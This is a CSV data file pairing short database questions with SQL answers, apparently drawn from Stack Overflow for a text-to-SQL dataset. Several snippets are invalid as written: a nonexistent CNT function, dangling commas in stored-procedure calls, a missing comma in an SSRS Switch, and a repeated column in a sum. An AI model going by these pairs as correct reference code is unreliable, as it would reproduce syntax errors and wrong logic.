,Unnamed: 0,NL,Code
35885,805,Remove double space in phpmyadmin,"update items set description= replace(description,space(2),space(1))
"
11473,56939,Summing multiple columns without specifying column names,"ALTER TABLE MY_TABLE 
ADD QTY_TOTAL AS QTY_1 + QTY_1 + QTY_1 + ...
"
25978,27962,Query to Insert the sum of salaries department wise in a table,"  Update table_name t2 set t2.TOTAL= (select t1.temp  from 
  (select DEPTNO ,sum(SAL) temp from table_name  group by DEPTNO) t1 where 
  t1.DEPTNO=t2.DEPTNO);
"
3595,3798,Rank books with ties,"SELECT * FROM book_ranks CER
INNER JOIN
(SELECT Rank() over (Order by book_score desc  ) 
  -- only difference is here ----------------^^
  as ranc, book_id
  FROM book_ranks
  WHERE Category = 'Fiction'
GROUP BY book_id, book_score 
) Ranker
ON CER.book_id = Ranker.book_id;
"
17418,21823,How to group common parameters when calling the same SQL Server stored procedures multiple times?,"use [MyDatabase]

-- Common parameters for all merge articles
DECLARE @publication sysname
DECLARE @source_owner sysname 
DECLARE @destination_owner sysname
DECLARE @allow_interactive_resolver nvarchar(5)
select @publication=N'MyPub',
       @source_owner=N'TheOwner', 
       @destination_owner=N'TheOwner',
       @allow_interactive_resolver=N'true'

exec sp_addmergearticle @publication=@publication,
                        @source_owner=@source_owner, 
                        @destination_owner=@destination_owner,
                        @allow_interactive_resolver=@allow_interactive_resolver,
                        @article=N'MyTable#1', 
                        @source_object=N'MyTable#1', 

exec sp_addmergearticle @publication=@publication,
                        @source_owner=@source_owner, 
                        @destination_owner=@destination_owner,
                        @allow_interactive_resolver=@allow_interactive_resolver,
                        @article=N'MyTable#2', 
                        @source_object=N'MyTable#2',
"
14317,1629,SQL Database SELECT question,"SELECT a.last_name, a.first_name, CNT(b.gamecount) totalcount 
FROM players a
JOIN (select cnt(*) gamecount, a.playerid
      FROM games  
      WHERE a.tournamentid = 47
      AND (white_player_id = a.playerid OR black_player_id = a.playerid)
      GROUP BY playerid
      ) b 
ON b.playerid = a.playerid
GROUP BY last_name, first_name
ORDER BY totalcount
"
19786,61230,Filtering out null values only if they exist in SQL select,"select id, col1, col2
from (SELECT a.id, a.col1, a.coll2,
             count(b.id) over () as numbs
      FROM tableA a LEFT OUTER JOIN tableB b ON b.col1=a.col1 and b.col2='value'
      WHERE a.id = @id AND a.col2= @arg
     ) ab
where numbs = 0 or b.id is not null;
"
33279,33760,Filter students that have not passed a subject yet,"SELECT `Reg.No`, SubjectCode, SUM(`Pass/Fail` = 'Pass')
FROM results
GROUP  BY `Reg.No`, SubjectCode
HAVING SUM(`Pass/Fail` = 'Pass') = 0;
"
35856,57618,Sql query needs to sort on multiple date columns together,"select top 10 * from core_table
order by
  CASE
      WHEN start_date >= process_date AND start_date >= archive_date 
          THEN  start_date
      WHEN process_date >= archive_date 
          THEN  process_date
      ELSE  archive_date
  END
 DESC
"
14046,73297,How to use If Else in SSRS expression,"=Switch
(
    Fields!VariableValue.Value = 1, ""Pass"",
    Fields!VariableValue.Value = 2, ""Fail"",
    Fields!VariableValue.Value = 3, ""Abort"",
    Fields!VariableValue.Value = 4, ""ByPass"",
    Fields!VariableValue.Value = ""#Error"", ""NA""
    true, Fields!VariableValue.Value
)
"
14743,50534,limiting union result in oracle,"select *
  from ( select
            ...
          union
         select
            ...
       )
 where rownum <= 500
"
32034,9431,SQL Server 2008 R2 Recursive Update Loop,"WITH    FileList
AS
(
    -- Select all the files that have no children
    SELECT   f.FILE_ID 
            ,f.FILE_SIZE
            ,f.PARENT_ID
            ,0 AS CHILD_ID
            ,0 AS Depth
    FROM    FILES f
            LEFT JOIN
            FILES f1 ON f.FILE_ID=f1.PARENT_ID
    WHERE   f1.PARENT_ID IS NULL
    UNION ALL
    -- Then recursively select thrir parents
    SELECT   f.FILE_ID
            ,fl.FILE_SIZE
            ,f.PARENT_ID
            ,fl.FILE_ID
            ,fl.Depth + 1
    FROM    FileList fl
            INNER JOIN
            FILES f ON f.FILE_ID=fl.PARENT_ID
)
-- With this data update the file size with the sum of all leaf nodes
UPDATE  FILES
SET     FILE_SIZE = (SELECT SUM(FILE_SIZE)
                    FROM    FileList fl
                    WHERE   fl.FILE_ID=FILES.FILE_ID
                    GROUP BY    FILE_ID)
"
9876,66049,Oracle Query with null values,"select case when rn = 1 then order_id end order_id,
       item
from   (select order_id,
               item,
               row_number() over (partition by order_id order by item) rn
        from   sales);

  ORDER_ID ITEM                
---------- --------------------
        10 RICE                
           SALT                
           WATER               
        20 ONION               
           TOMATO              
        30 EGG                 
           OIL                 
        40 CHICKEN             
        50 FISH      
"
